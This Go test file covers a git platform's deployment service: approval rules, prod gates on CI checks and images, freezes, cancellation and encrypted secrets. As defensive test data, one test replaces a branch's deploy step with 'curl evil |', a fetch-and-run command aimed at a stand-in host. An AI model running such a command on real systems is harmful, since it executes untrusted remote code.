package deploy_test

import (
	"context"
	"encoding/json"
	"errors"
	"slices"
	"strings"
	"testing"

	"onegit/internal/ci"
	"onegit/internal/config"
	"onegit/internal/deploy"
	"onegit/internal/git"
	"onegit/internal/store"
	"onegit/internal/testutil"
)

var ctx = context.Background()

const recipe = `
targets:
  environment: [dev, prod]
runs-on: [deploy]
artifact: {image: "app/${project}", tag: "${sha}-${environment}"}
env: {MODE: recipe}
steps:
  - run: ./deploy.sh "$PROJECT" "$ENVIRONMENT"
`

type env struct {
	t    *testing.T
	cfg  *config.Config
	st   *store.Store
	repo *git.Repo
	work *testutil.Work
	ci   *ci.Service
	svc  *deploy.Service
	main string // main tip

	writer, sre1, sre2, alice, owner, admin *store.User
}

func setup(t *testing.T) *env {
	t.Helper()
	cfg := testutil.Config(t)
	cfg.HTTP.BaseURL = "https://git.example.com"
	cfg.Secrets.Key = "test secret key"
	e := &env{t: t, cfg: cfg, st: testutil.Store(t, cfg), repo: testutil.Bare(t), work: testutil.NewWork(t)}
	e.ci = &ci.Service{Store: e.st, Repo: e.repo, Cfg: cfg, Log: testutil.Logger()}
	var err error
	if e.svc, err = deploy.New(ctx, e.st, e.repo, e.ci, cfg, testutil.Logger()); err != nil {
		t.Fatal(err)
	}
	e.writer = testutil.User(t, e.st, "writer", store.RoleWrite)
	e.sre1 = testutil.User(t, e.st, "sre1", store.RoleWrite)
	e.sre2 = testutil.User(t, e.st, "sre2", store.RoleWrite)
	e.alice = testutil.User(t, e.st, "alice", store.RoleWrite) // the commit author (alice@example.com)
	e.owner = testutil.User(t, e.st, "apiowner", store.RoleWrite)
	e.admin = testutil.User(t, e.st, "boss", store.RoleAdmin)
	sre := &store.Team{Name: "SRE"}
	testutil.Must(t, e.st.SaveTeam(ctx, sre))
	for _, u := range []*store.User{e.sre1, e.sre2, e.alice} {
		testutil.Must(t, e.st.AddTeamMember(ctx, sre.ID, u.ID))
	}

	e.main = e.work.Commit("init", map[string]string{
		"projects/api/project.yaml": "name: api", "projects/web/project.yaml": "name: web", "projects/lib/README": "no project.yaml",
		".onegit/deploy/app.yml": recipe, ".github/CODEOWNERS": "/projects/api/ @apiowner\n",
	})
	e.work.Push(e.repo, "main")

	testutil.Must(t, e.st.SaveDeployDimension(ctx, &store.DeployDimension{Name: "project", Position: 1, Source: "paths",
		PathPattern: "projects/*/project.yaml"}))
	testutil.Must(t, e.st.SaveDeployDimension(ctx, &store.DeployDimension{Name: "environment", Position: 2, Source: "list",
		Values: []string{"dev", "prod"}}))
	for _, r := range []*store.DeployRule{
		{Kind: "grant", Description: "writers deploy to dev", Selector: store.Selector{"environment": {"dev"}},
			Principals: []store.Principal{{Type: "role", Value: "write"}}},
		{Kind: "grant", Description: "SRE deploy to prod", Selector: store.Selector{"environment": {"prod"}},
			Principals: []store.Principal{{Type: "team", Value: "sre"}, {Type: "codeowners"}}},
		{Kind: "require", Description: "prod gate", Selector: store.Selector{"environment": {"prod"}},
			Branches: []string{"main"}, RequireChecks: true, RequireCIArtifact: true, Approvals: 1,
			Approvers: []store.Principal{{Type: "team", Value: "sre"}}},
		{Kind: "require", Description: "review unmerged code", Selector: store.Selector{"environment": {"dev"}},
			Approvals: 1, ExceptBranches: []string{"main"}},
	} {
		testutil.Must(t, e.st.SaveDeployRule(ctx, r))
	}
	return e
}

func target(project, environment string) deploy.Target {
	return deploy.Target{"project": project, "environment": environment}
}

// makeProdReady adds passing checks and a CI-built image for sha.
func (e *env) makeProdReady(sha, project string) {
	e.t.Helper()
	testutil.Must(e.t, e.st.SetCommitStatus(ctx, &store.CommitStatus{SHA: sha, Context: "ci / test", State: "success"}, nil))
	e.image(project, sha+"-prod", sha)
}

func (e *env) image(project, tag, buildSHA string) *store.RegistryManifest {
	e.t.Helper()
	m := &store.RegistryManifest{Repo: "app/" + project, Digest: "sha256:" + strings.Repeat("0", 56) + tag[:8],
		MediaType: "application/vnd.oci.image.manifest.v1+json", Content: []byte("{}"), BuildSHA: buildSHA}
	testutil.Must(e.t, e.st.PutRegistryManifest(ctx, m, nil, nil, tag))
	return m
}

func checkKinds(te *deploy.TargetEval) map[string]bool {
	out := map[string]bool{}
	for _, c := range te.Checks {
		out[c.Kind] = c.OK
	}
	return out
}

func userErr(err error) bool {
	var ue *deploy.UserError
	return errors.As(err, &ue)
}

func TestTargets(t *testing.T) {
	tg := deploy.Target{"environment": "prod", "project": "api"}
	if tg.Key() != "environment=prod,project=api" {
		t.Errorf("Key = %q", tg.Key())
	}
	if back := deploy.ParseTargetKey(tg.Key()); back["project"] != "api" || len(back) != 2 {
		t.Errorf("ParseTargetKey = %v", back)
	}
	if len(deploy.ParseTargetKey("garbage")) != 0 {
		t.Error("garbage key parsed")
	}
	dims := []*store.DeployDimension{{Name: "project"}, {Name: "environment"}, {Name: "region"}}
	if tg.Label(dims) != "api / prod" {
		t.Errorf("Label = %q", tg.Label(dims))
	}
}

func TestDimensionsAndRefs(t *testing.T) {
	t.Parallel()
	e := setup(t)
	dims, _ := e.st.ListDeployDimensions(ctx)
	vals := e.svc.DimensionValues(ctx, dims, e.main)
	if !slices.Equal(vals["project"], []string{"api", "web"}) || !slices.Equal(vals["environment"], []string{"dev", "prod"}) {
		t.Errorf("values = %v", vals)
	}
	if v := e.svc.DimensionValues(ctx, dims, ""); v["project"] != nil {
		t.Errorf("no sha: %v", v)
	}
	e.work.Git("tag", "v1", e.main)
	e.work.Push(e.repo, "refs/tags/v1")
	for _, ref := range []string{"main", "v1", e.main, e.main[:8], " main "} {
		if sha, err := e.svc.ResolveRef(ctx, ref); err != nil || sha != e.main {
			t.Errorf("ResolveRef(%q) = %s, %v", ref, sha, err)
		}
	}
	if _, err := e.svc.ResolveRef(ctx, "nope"); !userErr(err) {
		t.Errorf("ResolveRef(nope): %v", err)
	}
	if e.svc.DefaultBranch(ctx) != "main" || !e.svc.KeyFromEnv() {
		t.Error("DefaultBranch / KeyFromEnv")
	}
}

func TestDevDeployFromMainStartsAtOnce(t *testing.T) {
	t.Parallel()
	e := setup(t)
	d, ev, err := e.svc.Request(ctx, e.writer, "main", []deploy.Target{target("api", "dev"), target("web", "dev")}, " ship it ")
	if err != nil {
		t.Fatal(err)
	}
	if d.Status != "running" || d.RunID == nil || d.Comment != "ship it" || ev.ApprovalsPending() || ev.Blocked() {
		t.Fatalf("deployment = %+v", d)
	}
	for _, te := range ev.Targets {
		kinds := checkKinds(te)
		if !kinds["recipe"] || !kinds["grant"] || !kinds["exempt"] || te.Recipe != ".onegit/deploy/app.yml" {
			t.Errorf("%s checks = %+v", te.Label, te.Checks)
		}
	}
	jobs, _ := e.st.JobsForRun(ctx, *d.RunID)
	if len(jobs) != 2 || jobs[0].Kind != "deploy" || *jobs[0].TargetKey != "environment=dev,project=api" || jobs[0].Name != "api / dev" {
		t.Fatalf("jobs = %+v", jobs)
	}
	var payload ci.JobPayload
	json.Unmarshal(jobs[0].Spec, &payload)
	if payload.RecipeSHA != e.main || payload.Env["MODE"] != "recipe" || payload.Env["ONEGIT_ARTIFACT"] != "" {
		t.Errorf("payload = %+v", payload)
	}
	// The deployment follows its run.
	testutil.Must(t, e.ci.FinishJob(ctx, jobs[0].ID, store.JobSuccess, ""))
	if got, _ := e.st.DeploymentByID(ctx, d.ID); got.Status != "running" {
		t.Errorf("status after one job = %s", got.Status)
	}
	testutil.Must(t, e.ci.FinishJob(ctx, jobs[1].ID, store.JobSuccess, ""))
	if got, _ := e.st.DeploymentByID(ctx, d.ID); got.Status != "success" || got.FinishedAt == nil {
		t.Errorf("status after run = %s", got.Status)
	}
	audit, _ := e.st.ListAudit(ctx, 10)
	if len(audit) != 2 || audit[0].Action != "deploy.start" || audit[1].Action != "deploy.request" {
		t.Errorf("audit = %+v", audit)
	}
}

func TestUnmergedCodeNeedsApproval(t *testing.T) {
	t.Parallel()
	e := setup(t)
	e.work.Git("checkout", "-q", "-b", "feature")
	sha := e.work.Commit("wip", map[string]string{"projects/api/x": "x"})
	e.work.Push(e.repo, "feature")
	d, ev, err := e.svc.Request(ctx, e.writer, "feature", []deploy.Target{target("api", "dev")}, "")
	if err != nil {
		t.Fatal(err)
	}
	if d.Status != "pending" || d.SHA != sha || d.RecipeSHA != e.main || !ev.ApprovalsPending() || ev.Approvals[0].Approvers != "anyone with write access" {
		t.Fatalf("deployment = %+v, eval %+v", d, ev.Approvals)
	}
	// The requester can't approve; the commit author can't either.
	if _, err := e.svc.Review(ctx, e.writer, d.ID, true, ""); !userErr(err) {
		t.Errorf("self-approval: %v", err)
	}
	if _, err := e.svc.Review(ctx, e.alice, d.ID, true, ""); !userErr(err) {
		t.Errorf("author approval: %v", err)
	}
	cur, _ := e.svc.Current(ctx, d)
	if !e.svc.CanApprove(ctx, e.sre1, d, cur) || e.svc.CanApprove(ctx, e.alice, d, cur) || e.svc.CanApprove(ctx, nil, d, cur) {
		t.Error("CanApprove")
	}
	d, err = e.svc.Review(ctx, e.sre1, d.ID, true, "ok")
	if err != nil || d.Status != "running" {
		t.Fatalf("after approval = %+v, %v", d, err)
	}
	if _, err := e.svc.Review(ctx, e.sre2, d.ID, true, ""); !userErr(err) {
		t.Errorf("review of a running deployment: %v", err)
	}
}

func TestProdGate(t *testing.T) {
	t.Parallel()
	e := setup(t)
	api := []deploy.Target{target("api", "prod")}

	// Writers have no prod grant.
	_, ev, err := e.svc.Request(ctx, e.writer, "main", api, "")
	if !userErr(err) || checkKinds(ev.Targets[0])["grant"] {
		t.Fatalf("writer prod request: %v", err)
	}
	// SRE: no checks, no image yet.
	ev, err = e.svc.Plan(ctx, e.sre1, "main", api)
	testutil.Must(t, err)
	kinds := checkKinds(ev.Targets[0])
	if !kinds["grant"] || !kinds["branch"] || kinds["checks"] || kinds["artifact"] || !ev.Blocked() {
		t.Errorf("checks = %+v", ev.Targets[0].Checks)
	}
	testutil.Must(t, e.st.SetCommitStatus(ctx, &store.CommitStatus{SHA: e.main, Context: "ci / test", State: "failure"}, nil))
	ev, _ = e.svc.Plan(ctx, e.sre1, "main", api)
	if p := strings.Join(ev.Problems(), "|"); !strings.Contains(p, "ci / test (failure)") || !strings.Contains(p, "does not exist") {
		t.Errorf("problems = %s", p)
	}
	// A hand-pushed image is refused, as is one built from another commit.
	e.makeProdReady(e.main, "web")
	e.image("api", e.main+"-prod", "")
	ev, _ = e.svc.Plan(ctx, e.sre1, "main", api)
	if p := strings.Join(ev.Problems(), "|"); !strings.Contains(p, "pushed by hand") {
		t.Errorf("hand-pushed image: %s", p)
	}
	testutil.Must(t, e.st.SetCommitStatus(ctx, &store.CommitStatus{SHA: e.main, Context: "ci / test", State: "success"}, nil))
	m := &store.RegistryManifest{Repo: "app/api", Digest: "sha256:" + strings.Repeat("1", 64), MediaType: "x",
		Content: []byte("{}"), BuildSHA: strings.Repeat("9", 40)}
	testutil.Must(t, e.st.PutRegistryManifest(ctx, m, nil, nil, e.main+"-prod"))
	ev, _ = e.svc.Plan(ctx, e.sre1, "main", api)
	if p := strings.Join(ev.Problems(), "|"); !strings.Contains(p, "built by CI from 9999999999") {
		t.Errorf("image from another commit: %s", p)
	}
	good := &store.RegistryManifest{Repo: "app/api", Digest: "sha256:" + strings.Repeat("2", 64), MediaType: "x",
		Content: []byte("{}"), BuildSHA: e.main}
	testutil.Must(t, e.st.PutRegistryManifest(ctx, good, nil, nil, e.main+"-prod"))

	d, ev, err := e.svc.Request(ctx, e.sre1, "main", api, "")
	if err != nil || d.Status != "pending" || ev.Targets[0].Artifact != "git.example.com/app/api@"+good.Digest {
		t.Fatalf("request = %+v, %v, artifact %q", d, err, ev.Targets[0].Artifact)
	}
	// Only SRE members may approve, the requester and the commit author excluded.
	if _, err := e.svc.Review(ctx, e.writer, d.ID, true, ""); !userErr(err) {
		t.Errorf("non-SRE approval: %v", err)
	}
	if _, err := e.svc.Review(ctx, e.alice, d.ID, true, ""); !userErr(err) {
		t.Errorf("author approval: %v", err)
	}
	d, err = e.svc.Review(ctx, e.sre2, d.ID, true, "")
	if err != nil || d.Status != "running" {
		t.Fatalf("approved = %+v, %v", d, err)
	}
	jobs, _ := e.st.JobsForRun(ctx, *d.RunID)
	var payload ci.JobPayload
	json.Unmarshal(jobs[0].Spec, &payload)
	if payload.Env["ONEGIT_ARTIFACT"] != "git.example.com/app/api@"+good.Digest {
		t.Errorf("pinned artifact = %q", payload.Env["ONEGIT_ARTIFACT"])
	}
	// A running deployment can be cancelled by its requester.
	if err := e.svc.Cancel(ctx, e.writer, d.ID); !userErr(err) {
		t.Errorf("cancel by a stranger: %v", err)
	}
	testutil.Must(t, e.svc.Cancel(ctx, e.sre1, d.ID))
	if got, _ := e.st.DeploymentByID(ctx, d.ID); got.Status != "cancelled" {
		t.Errorf("status after cancel = %s", got.Status)
	}
	if err := e.svc.Cancel(ctx, e.admin, d.ID); !userErr(err) {
		t.Errorf("cancel of a finished deployment: %v", err)
	}
}

func TestCommitNotOnMainIsRefusedForProd(t *testing.T) {
	t.Parallel()
	e := setup(t)
	e.work.Git("checkout", "-q", "-b", "hotfix")
	sha := e.work.Commit("hotfix", map[string]string{"projects/api/fix": "f"})
	e.work.Push(e.repo, "hotfix")
	e.makeProdReady(sha, "api")
	_, ev, err := e.svc.Request(ctx, e.sre1, "hotfix", []deploy.Target{target("api", "prod")}, "")
	if !userErr(err) || checkKinds(ev.Targets[0])["branch"] {
		t.Errorf("hotfix to prod: %v", err)
	}
}

func TestRejectAndCancelPending(t *testing.T) {
	t.Parallel()
	e := setup(t)
	e.makeProdReady(e.main, "api")
	d, _, err := e.svc.Request(ctx, e.sre1, "main", []deploy.Target{target("api", "prod")}, "")
	testutil.Must(t, err)
	d, err = e.svc.Review(ctx, e.sre2, d.ID, false, "not today")
	if err != nil || d.Status != "rejected" {
		t.Errorf("rejected = %+v, %v", d, err)
	}
	ev, _ := e.svc.Current(ctx, d)
	if !slices.Equal(ev.RejectedBy, []string{"sre2"}) {
		t.Errorf("RejectedBy = %v", ev.RejectedBy)
	}

	d2, _, err := e.svc.Request(ctx, e.sre1, "main", []deploy.Target{target("api", "prod")}, "")
	testutil.Must(t, err)
	testutil.Must(t, e.svc.Cancel(ctx, e.admin, d2.ID)) // admins may cancel anything
	if got, _ := e.st.DeploymentByID(ctx, d2.ID); got.Status != "cancelled" {
		t.Errorf("status = %s", got.Status)
	}
	if _, err := e.svc.Review(ctx, e.sre2, 99999, true, ""); !errors.Is(err, store.ErrNotFound) {
		t.Errorf("review of a missing deployment: %v", err)
	}
}

func TestCodeOwnersGrant(t *testing.T) {
	t.Parallel()
	e := setup(t)
	e.makeProdReady(e.main, "api")
	e.makeProdReady(e.main, "web")
	ev, _ := e.svc.Plan(ctx, e.owner, "main", []deploy.Target{target("api", "prod")})
	if !checkKinds(ev.Targets[0])["grant"] {
		t.Errorf("code owner of api: %+v", ev.Targets[0].Checks)
	}
	ev, _ = e.svc.Plan(ctx, e.owner, "main", []deploy.Target{target("web", "prod")})
	if checkKinds(ev.Targets[0])["grant"] {
		t.Error("code owner of api may deploy web")
	}
}

func TestFreezeAndRecipeProblems(t *testing.T) {
	t.Parallel()
	e := setup(t)
	testutil.Must(t, e.st.SaveDeployRule(ctx, &store.DeployRule{Kind: "require", Freeze: true, FreezeMessage: "release week",
		Selector: store.Selector{"project": {"web"}}}))
	ev, _ := e.svc.Plan(ctx, e.writer, "main", []deploy.Target{target("web", "dev")})
	if p := strings.Join(ev.Problems(), "|"); !strings.Contains(p, "frozen") || !strings.Contains(p, "release week") {
		t.Errorf("freeze: %s", p)
	}
	ev, _ = e.svc.Plan(ctx, e.writer, "main", []deploy.Target{target("api", "qa")})
	if p := strings.Join(ev.Problems(), "|"); !strings.Contains(p, "No deploy recipe") {
		t.Errorf("no recipe: %s", p)
	}
	e.work.Commit("second recipe", map[string]string{".onegit/deploy/other.yml": "targets: {project: [api]}\nsteps: [{run: x}]\n"})
	e.work.Push(e.repo, "main")
	ev, _ = e.svc.Plan(ctx, e.writer, "main", []deploy.Target{target("api", "dev")})
	if p := strings.Join(ev.Problems(), "|"); !strings.Contains(p, "Several recipes") {
		t.Errorf("two recipes: %s", p)
	}
	if _, err := e.svc.Plan(ctx, e.writer, "main", nil); !userErr(err) {
		t.Errorf("no targets: %v", err)
	}
	if _, err := e.svc.Plan(ctx, e.writer, "nope", []deploy.Target{target("api", "dev")}); !userErr(err) {
		t.Errorf("bad ref: %v", err)
	}
}

func TestRecipesComeFromTheDefaultBranch(t *testing.T) {
	t.Parallel()
	e := setup(t)
	// A branch that rewrites the recipe still deploys with main's recipe.
	e.work.Git("checkout", "-q", "-b", "evil")
	e.work.Commit("evil recipe", map[string]string{".onegit/deploy/app.yml": strings.Replace(recipe, "./deploy.sh", "curl evil |", 1)})
	e.work.Push(e.repo, "evil")
	d, _, err := e.svc.Request(ctx, e.writer, "evil", []deploy.Target{target("api", "dev")}, "")
	testutil.Must(t, err)
	d, err = e.svc.Review(ctx, e.sre1, d.ID, true, "")
	testutil.Must(t, err)
	jobs, _ := e.st.JobsForRun(ctx, *d.RunID)
	var payload ci.JobPayload
	json.Unmarshal(jobs[0].Spec, &payload)
	if strings.Contains(payload.Steps[0].Run, "evil") || payload.RecipeSHA != e.main {
		t.Errorf("deployed with the branch's recipe: %+v", payload)
	}
}

func TestSecrets(t *testing.T) {
	t.Parallel()
	e := setup(t)
	save := func(name, value string, sel store.Selector) *store.DeploySecret {
		sec := &store.DeploySecret{Name: name, Selector: sel}
		testutil.Must(t, e.svc.SaveSecret(ctx, e.admin, sec, value))
		return sec
	}
	if err := e.svc.SaveSecret(ctx, e.admin, &store.DeploySecret{Name: "X"}, ""); err == nil {
		t.Error("a new secret without a value")
	}
	save("TOKEN", "generic-token", nil)
	prod := save("TOKEN", "prod-token", store.Selector{"environment": {"prod"}})
	save("TOKEN", "prod-api-token", store.Selector{"environment": {"prod"}, "project": {"api"}})
	save("DB", "dev-db", store.Selector{"environment": {"dev"}})

	for tg, want := range map[string]map[string]string{
		"api/prod": {"TOKEN": "prod-api-token"},
		"web/prod": {"TOKEN": "prod-token"},
		"web/dev":  {"TOKEN": "generic-token", "DB": "dev-db"},
	} {
		p, env, _ := strings.Cut(tg, "/")
		got, err := e.svc.SecretsFor(ctx, target(p, env))
		if err != nil || len(got) != len(want) {
			t.Errorf("%s: %v, %v", tg, got, err)
		}
		for k, v := range want {
			if got[k] != v {
				t.Errorf("%s: %s = %q, want %q", tg, k, got[k], v)
			}
		}
	}
	// Updating without a value keeps the old one; stored values are encrypted.
	prod.Selector = store.Selector{"environment": {"prod*"}}
	testutil.Must(t, e.svc.SaveSecret(ctx, e.admin, prod, ""))
	all, _ := e.st.ListDeploySecrets(ctx)
	for _, s := range all {
		if strings.Contains(string(s.Value), "token") {
			t.Errorf("secret %s stored in clear text", s.Name)
		}
	}
	if got, _ := e.svc.SecretsFor(ctx, target("web", "production")); got["TOKEN"] != "prod-token" {
		t.Errorf("after selector update: %v", got)
	}

	// Another key cannot decrypt them.
	other := *e.cfg
	other.Secrets.Key = "another key"
	s2, err := deploy.New(ctx, e.st, e.repo, &ci.Service{Store: e.st, Repo: e.repo, Cfg: &other, Log: testutil.Logger()}, &other, testutil.Logger())
	testutil.Must(t, err)
	if _, err := s2.SecretsFor(ctx, target("api", "prod")); err == nil || !strings.Contains(err.Error(), "ONEGIT_SECRET_KEY") {
		t.Errorf("decrypt with another key: %v", err)
	}
	// Without a configured key, one is generated once and kept in the database.
	other.Secrets.Key = ""
	s3, err := deploy.New(ctx, e.st, e.repo, &ci.Service{Store: e.st, Repo: e.repo, Cfg: &other, Log: testutil.Logger()}, &other, testutil.Logger())
	testutil.Must(t, err)
	if s3.KeyFromEnv() {
		t.Error("KeyFromEnv with an empty key")
	}
	sec := &store.DeploySecret{Name: "DBKEY"}
	testutil.Must(t, s3.SaveSecret(ctx, e.admin, sec, "value-1234"))
	s4, _ := deploy.New(ctx, e.st, e.repo, &ci.Service{Store: e.st, Repo: e.repo, Cfg: &other, Log: testutil.Logger()}, &other, testutil.Logger())
	testutil.Must(t, e.st.DeleteDeploySecret(ctx, prod.ID))
	for _, s := range all {
		if s.Name == "TOKEN" || s.Name == "DB" {
			e.st.DeleteDeploySecret(ctx, s.ID)
		}
	}
	if got, err := s4.SecretsFor(ctx, target("x", "y")); err != nil || got["DBKEY"] != "value-1234" {
		t.Errorf("database key: %v, %v", got, err)
	}
}
